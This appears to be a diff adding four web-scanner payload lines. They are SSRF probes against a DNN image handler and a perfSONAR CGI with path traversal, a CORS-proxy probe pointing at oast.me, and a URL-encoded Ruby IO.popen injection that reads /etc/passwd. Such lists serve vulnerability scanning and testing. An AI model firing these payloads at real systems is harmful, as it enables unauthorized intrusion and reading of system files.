@@ -1,0 +1,4 @@
+/DnnImageHandler.ashx?mode=file&url=http://{{interactsh-url}}
+?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
+/cors_proxy/https://oast.me/
+/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://{{interactsh-url}}/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4
